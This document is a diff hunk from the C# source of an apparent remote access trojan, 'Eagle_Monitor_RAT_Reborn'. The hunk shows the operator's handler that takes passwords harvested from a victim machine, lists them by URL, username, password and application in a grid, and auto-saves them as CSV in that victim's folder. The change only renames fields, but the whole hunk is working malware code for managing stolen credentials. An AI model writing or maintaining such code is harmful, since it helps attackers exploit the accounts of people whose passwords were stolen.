@@ -18,29 +18,29 @@ namespace Eagle_Monitor_RAT_Reborn.PacketHandler
             {
                 try
                 {
-                    if (ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientForm.passwordsDataGridView != null)
+                    if (ClientHandler.ClientHandlersList[passwordsPacket.BaseIp].ClientForm.passwordsDataGridView != null)
                     {
-                        ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientForm.passwordsDataGridView.BeginInvoke((MethodInvoker)(() =>
+                        ClientHandler.ClientHandlersList[passwordsPacket.BaseIp].ClientForm.passwordsDataGridView.BeginInvoke((MethodInvoker)(() =>
                         {
-                            ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientForm.passwordsDataGridView.Rows.Clear();
+                            ClientHandler.ClientHandlersList[passwordsPacket.BaseIp].ClientForm.passwordsDataGridView.Rows.Clear();
                             foreach (object[] str in passwordsPacket.passwordsList)
                             {
-                                int rowId = ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientForm.passwordsDataGridView.Rows.Add();
-                                DataGridViewRow row = ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientForm.passwordsDataGridView.Rows[rowId];
+                                int rowId = ClientHandler.ClientHandlersList[passwordsPacket.BaseIp].ClientForm.passwordsDataGridView.Rows.Add();
+                                DataGridViewRow row = ClientHandler.ClientHandlersList[passwordsPacket.BaseIp].ClientForm.passwordsDataGridView.Rows[rowId];
                                 row.Cells["Column1"].Value = str[0].ToString();
                                 row.Cells["Column2"].Value = str[1].ToString();
                                 row.Cells["Column3"].Value = str[2].ToString();
                                 row.Cells["Column4"].Value = str[3].ToString();
                             }
                             if (Program.settings.autoSaveRecovery)
-                                Utils.ToCSV(ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientForm.passwordsDataGridView, ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientPath + "\\Passwords\\" + Utils.DateFormater() + ".csv");
+                                Utils.ToCSV(ClientHandler.ClientHandlersList[passwordsPacket.BaseIp].ClientForm.passwordsDataGridView, ClientHandler.ClientHandlersList[passwordsPacket.BaseIp].ClientPath + "\\Passwords\\" + Utils.DateFormater() + ".csv");
                             return;
                         }));
                     }
                     else
-                    { Utils.ToCSV(passwordsPacket.passwordsList, ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientPath + "\\Passwords\\" + Utils.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
+                    { Utils.ToCSV(passwordsPacket.passwordsList, ClientHandler.ClientHandlersList[passwordsPacket.BaseIp].ClientPath + "\\Passwords\\" + Utils.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
                 }
-                catch { Utils.ToCSV(passwordsPacket.passwordsList, ClientHandler.ClientHandlersList[passwordsPacket.baseIp].clientPath + "\\Passwords\\" + Utils.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
+                catch { Utils.ToCSV(passwordsPacket.passwordsList, ClientHandler.ClientHandlersList[passwordsPacket.BaseIp].ClientPath + "\\Passwords\\" + Utils.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
             }
             else
                 return;
